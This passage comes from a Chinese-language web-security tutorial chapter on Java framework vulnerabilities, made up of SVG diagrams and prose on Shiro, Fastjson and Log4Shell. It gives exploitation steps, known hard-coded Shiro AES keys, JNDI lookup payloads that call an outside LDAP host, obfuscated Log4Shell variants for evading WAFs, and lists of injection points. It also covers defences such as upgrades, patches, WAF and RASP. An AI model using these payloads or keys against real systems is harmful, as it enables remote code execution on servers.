  <text x="650" y="138" text-anchor="middle" font-size="11" fill="#881337">Log4j2 2.0-beta9 ~ 2.14.1</text>
  <text x="650" y="152" text-anchor="middle" font-size="11" fill="#881337">特征: 只要能让字符串进日志就触发</text>
  
  <!-- 利用流程 - Shiro -->
  <rect x="50" y="200" width="200" height="140" rx="8" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
  <text x="150" y="220" text-anchor="middle" font-size="13" font-weight="bold" fill="#991b1b">Shiro利用4步法</text>
  <text x="150" y="242" text-anchor="middle" font-size="11" fill="#7f1d1d">① 扫Cookie: rememberMe=deleteMe</text>
  <text x="150" y="258" text-anchor="middle" font-size="11" fill="#7f1d1d">② 爆破AES密钥(默认kPH+bIxk5D2deZiIxcaaaA==)</text>
  <text x="150" y="274" text-anchor="middle" font-size="11" fill="#7f1d1d">③ 工具生成恶意序列化 → AES加密</text>
  <text x="150" y="290" text-anchor="middle" font-size="11" fill="#7f1d1d">④ Cookie里带rememberMe发请求</text>
  <text x="150" y="315" text-anchor="middle" font-size="12" font-weight="bold" fill="#b91c1c">🎯 = RCE成功!</text>
  <text x="150" y="330" text-anchor="middle" font-size="10" fill="#b91c1c">推荐工具: shiro_attack / ShiroExploit</text>
  
  <!-- 利用流程 - Fastjson -->
  <rect x="300" y="200" width="200" height="140" rx="8" fill="#fff7ed" stroke="#ea580c" stroke-width="2"/>
  <text x="400" y="220" text-anchor="middle" font-size="13" font-weight="bold" fill="#9a3412">Fastjson利用4步法</text>
  <text x="400" y="242" text-anchor="middle" font-size="11" fill="#7c2d12">① 找JSON接口(PUT/POST Body为JSON)</text>
  <text x="400" y="258" text-anchor="middle" font-size="11" fill="#7c2d12">② 起LDAP服务(marshalsec 1389端口)</text>
  <text x="400" y="274" text-anchor="middle" font-size="11" fill="#7c2d12">③ 起HTTP服务(Exploit.class 8000端口)</text>
  <text x="400" y="290" text-anchor="middle" font-size="11" fill="#7c2d12">④ 发JSON: {"@type":"JdbcRowSetImpl"...}</text>
  <text x="400" y="315" text-anchor="middle" font-size="12" font-weight="bold" fill="#c2410c">🎯 = JNDI加载恶意类 → RCE!</text>
  <text x="400" y="330" text-anchor="middle" font-size="10" fill="#c2410c">推荐工具: JNDI-Injection-Exploit</text>
  
  <!-- 利用流程 - Log4j -->
  <rect x="550" y="200" width="200" height="140" rx="8" fill="#fff1f2" stroke="#e11d48" stroke-width="2"/>
  <text x="650" y="220" text-anchor="middle" font-size="13" font-weight="bold" fill="#9f1239">Log4Shell利用4步法</text>
  <text x="650" y="242" text-anchor="middle" font-size="11" fill="#881337">① 先DNSLog验证: ${jndi:ldap://xxx.dnslog.cn/a}</text>
  <text x="650" y="258" text-anchor="middle" font-size="11" fill="#881337">② 起LDAP服务(marshalsec / JNDIExploit)</text>
  <text x="650" y="274" text-anchor="middle" font-size="11" fill="#881337">③ 起HTTP服务放恶意Exploit.class</text>
  <text x="650" y="290" text-anchor="middle" font-size="11" fill="#881337">④ Payload塞UA/Cookie/搜索框/URL里</text>
  <text x="650" y="315" text-anchor="middle" font-size="12" font-weight="bold" fill="#be123c">🎯 = 打日志自动触发 → RCE!</text>
  <text x="650" y="330" text-anchor="middle" font-size="10" fill="#be123c">入口最多, 零登录权限即可!</text>
  
  <!-- 共同点：JNDI + 工具 -->
  <rect x="180" y="380" width="440" height="100" rx="10" fill="#fef3c7" stroke="#b45309" stroke-width="2"/>
  <text x="400" y="405" text-anchor="middle" font-size="16" font-weight="bold" fill="#92400e">🔗 三大漏洞共同核心: JNDI注入 + 工具链</text>
  <text x="260" y="430" text-anchor="start" font-size="12" fill="#78350f">🧱 底层原理:</text>
  <text x="340" y="430" text-anchor="start" font-size="12" fill="#78350f">LDAP/RMI → 引用远程恶意类 → ClassLoader加载 → 代码执行</text>
  <text x="260" y="450" text-anchor="start" font-size="12" fill="#78350f">🛠️ 必备工具:</text>
  <text x="340" y="450" text-anchor="start" font-size="12" fill="#78350f">marshalsec / JNDI-Injection-Exploit / JNDIExploit-1.2 / ysoserial</text>
  <text x="260" y="470" text-anchor="start" font-size="12" fill="#78350f">⚠️ 共同限制:</text>
  <text x="340" y="470" text-anchor="start" font-size="12" fill="#78350f">高版本JDK 8u191+/11+ 需要额外Bypass, 但信息泄露依然可以用</text>
</svg>

---

### 三个漏洞实战判断顺序口诀 📜

> **"看Cookie，测JSON，剩下全塞Log4Shell！"** 🔍
> 
> 1. 先看Cookie有没有 `rememberMe=deleteMe` → 有就先打Shiro（最快）
> 2. 再看请求Body是不是JSON格式 → 是就扔Fastjson全版本Payload
> 3. 剩下所有位置（UA/XFF/Cookie/Search/Form）→ 全塞 `${jndi:ldap://...}` Log4Shell Payload
> 
> 按这个顺序来，Java站的命中率最少提升30%！🎯

---

## 六、框架漏洞怎么防？🛡️

讲了这么多可怕的框架漏洞，那我们该怎么防御呢？其实方法很简单，记住以下几点：

### 6.1 及时升级框架版本（最重要！）⭐⭐⭐

这是最最重要、最最有效的一条！

绝大多数框架漏洞，官方都会在新版本里修复。只要你及时把框架升级到最新的稳定版本，99%的框架漏洞都跟你没关系了。

就好比你买的手机，系统经常推送更新，很多更新都是修复安全漏洞的。你更不更新？反正我是更的……📱

很多人觉得"现在用着好好的，升级干嘛"，结果等到漏洞被利用了，数据被偷了，服务器被黑了，才后悔莫及。

记住：**及时升级，是成本最低、效果最好的安全措施！**

### 6.2 关注安全公告 📢

光知道升级还不够，你得知道什么时候该升级对吧？所以要养成关注安全公告的习惯。

关注哪些地方呢？
- 框架的官方博客、GitHub仓库
- 各种安全资讯网站
- 相关的技术社区

一旦你用的框架爆出了严重漏洞，第一时间升级或者采取防护措施。

就像你买了某品牌的电器，万一产品召回了，你得知道消息对吧？不然继续用可能有安全隐患……⚡

### 6.3 打补丁 🔧

有时候，大版本升级可能比较麻烦，改动太大，不敢随便升。这时候怎么办呢？

可以找官方出的安全补丁，只补漏洞，不升级整个框架。这样风险小一些。

当然，打补丁只是权宜之计，长远来看还是要升级到新版本的。

### 6.4 WAF防护（辅助手段）🛡️

WAF（Web应用防火墙）可以在一定程度上防护框架漏洞。因为很多框架漏洞的利用都有特征，WAF可以识别并拦截这些恶意请求。

但是要注意，WAF不是万能的！很多时候可以通过各种绕过手段来躲避WAF的检测。所以WAF只能作为辅助手段，不能把所有希望都寄托在WAF上。

就像你家小区门口的保安，能拦住一些可疑人员，但真遇到高手，保安也拦不住……你总不能因为有保安就不锁家门了吧？🔒

---

## 七、新手怎么学习框架漏洞？📚

很多新手小伙伴可能会问：框架漏洞这么多，我该怎么学啊？感觉学不完……

别急，给大家几个学习建议：

### 7.1 先复现，感受一下 🎮

刚开始学习的时候，不用急着去深入理解原理。先找几个经典的漏洞，用Vulhub把环境搭起来，亲手复现一下，感受感受漏洞的威力。

就像学游泳，先下水扑腾两下，找找感觉，比在岸上看十天半个月的理论有用多了！🏊

当你亲手构造一个URL，就让服务器执行了命令，那种成就感和震撼感，会让你对漏洞有更深刻的印象。

### 7.2 再理解原理（需要点编程基础）💻

复现了几个漏洞之后，你可能会好奇："为什么这样就能执行命令呢？背后的原理是什么？"

这时候就可以去深入理解原理了。当然，理解框架漏洞的原理需要一定的编程基础，你至少得懂一点PHP或者Java，知道框架大概是怎么工作的。

如果暂时看不懂也没关系，先放一放，等以后编程水平提高了再回来看。安全是个漫长的过程，不用急于一时。

### 7.3 不用每个都深入，知道有这么回事就行 🧠

框架漏洞太多了，光Struts2就几十个，你要每个都深入研究，那得研究到猴年马月去……

所以，**不用每个漏洞都深入理解原理**，知道有这么个漏洞、大概是什么类型的、怎么利用、危害有多大，就够了。

真正遇到的时候，再去查具体的利用方法和原理也不迟。毕竟，安全工程师也不是所有漏洞都能背下来的，大家都是边查边干~

### 7.4 重点关注影响大、出现频率高的 🎯

虽然漏洞多，但我们可以有重点地学习。哪些是重点呢？

- 影响范围广的（比如ThinkPHP、Struts2这种用的人多的框架）
- 危害大的（直接RCE的，这种最危险）
- 最近几年经常出现的（说明这类框架容易出问题，要多关注）

把有限的精力花在刀刃上，性价比最高~

---

## 八、本章总结 📝

好啦，这一章的内容就差不多了。我们来总结一下：

### 8.1 框架漏洞的特点 🎯

框架漏洞跟普通的业务漏洞不一样，它有几个明显的特点：
1. **影响范围广**：只要用了这个框架的网站都受影响
2. **危害大**：通常直接就是RCE，能接管服务器
3. **利用简单**：往往有现成的EXP，新手也能上手

正因为这些特点，框架漏洞一直是安全领域的重点关注对象。

### 8.2 我们复现了哪些漏洞 ✅

这一章我们动手复现了：
- **ThinkPHP 5.x RCE漏洞**：通过构造URL就能执行代码，PHP框架漏洞的代表
- **ThinkPHP 2.x RCE漏洞**：老版本框架的经典漏洞
- **Struts2 S2-045漏洞**：Java框架漏洞的代表，通过修改Content-Type头触发

除此之外，我们还简单了解了Laravel、Symfony、Flask/Django、Shiro等框架的常见漏洞。

### 8.3 防御的关键：及时升级 ⬆️

防御框架漏洞，最关键的就是四个字：**及时升级**！

只要你及时关注安全公告，及时升级框架版本，绝大多数框架漏洞都威胁不到你。

别嫌麻烦，跟服务器被黑、数据泄露比起来，升级那点工作量根本不算什么。

### 8.4 下章预告 📢

这一章我们学了Web框架的漏洞，下一章我们要学习的是**中间件漏洞**！

什么是中间件呢？比如Apache、Nginx、Tomcat这些，它们是运行网站的"容器"或者"服务器软件"。这些中间件也会出漏洞，而且同样可能导致RCE！

下一章，我们就来复现几个经典的中间件漏洞，比如Apache的解析漏洞、Nginx的漏洞、Tomcat的漏洞等等，同样很精彩，不容错过！🎊

---

**💪 加油！安全学习的路上，我们一起进步！** 🌟

---

# 🖼️ 本章拓展图解汇总（day-37 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gjmyhaowo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gjmyhaowo)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔥 三大Java核弹漏洞时间线</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2016 Shiro-550</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2017 Fastjson 1.2.24</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2019 1.2.47 Bypass</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2021 Shiro-721</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2021-12 Log4Shell</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gwhdcftwo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gwhdcftwo)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚔️ Shiro 550 / 721 对比</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">550 硬编码AES密钥</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">721 Padding Oracle</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">共同 rememberMe Cookie</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">共同 Commons反序列化</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">升级+禁用记住我</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gvx58un32" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gvx58un32)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔑 Shiro RememberMe 加密链路</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ysoserial生成对象</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">GZIP压缩字节</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AES-CBC 加密</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IV随机 前置拼接</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Base64编码 → Cookie</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g06qs286y" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g06qs286y)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 Shiro 常见硬编码密钥</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">kPH+bIxk5D2deZiIxcaaaA==</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Z3VucwAAAAAAAAAAAAAAAA==</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2AvVhdsgUs0FSA3SDFAdag==</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">4AvVhmFLUs0KTA3Kprsdag==</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">wGiHplamyXlVB11UXWol8g==</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">剩下100+见字典</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g3qiqfddh" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g3qiqfddh)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">💥 Fastjson 1.2.24 JNDI链</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JSON.parse(input)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">@type JdbcRowSetImpl</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">setAutoCommit 触发lookup</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">LDAP/RMI加载远程类</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RCE成功</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gkt0xs1oi" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gkt0xs1oi)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 Fastjson 版本安全演进</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.24 首发漏洞</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.25 AutoType默认关+黑名</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.42 黑名单绕过</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.47 Class缓存绕过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.68 SafeMode加固</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gs5zqfkt5" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gs5zqfkt5)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧪 JNDI 三大服务协议</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RMI 1099端口经典</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">LDAP 389端口最通用</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CORBA IIOP 穿透</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u191 远程限制</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">本地Factory绕过</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gskmdvmqx" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gskmdvmqx)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b91c1c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">☠️ Log4j2 注入点大全</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">User-Agent</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">X-Forwarded-For</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">登录用户名</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">搜索关键字</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">URL参数</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">所有被log的字段</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g9vtck4ua" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g9vtck4ua)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧨 Log4Shell Lookup变形</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${jndi:ldap://x}</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${lower:j}${lower:n}</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${${::-j}${::-n}}</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${env:USER}</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${sys:java.home}</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${java:version}</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gm451cpfl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gm451cpfl)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ 三大漏洞防御总表</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 升级1.8+ 换随机密钥</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson 1.2.83+ SafeMode</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Log4j2 升级 2.17.1+</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u342+ 禁用LDAP</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WAF关键词黑名单</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RASP Java Agent拦截</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gjrrb2dnb" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gjrrb2dnb)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#155e75" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔍 快速检测清单</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">rememberMe=deleteMe 指纹</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Server: Shiro</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">X-Api-Version Fastjson报错</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">%7Bjndi:ldap://ceye%7D</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Burp被动扫描</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nuclei templates</text>
</svg>

<svg width="800" height="382" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 382">
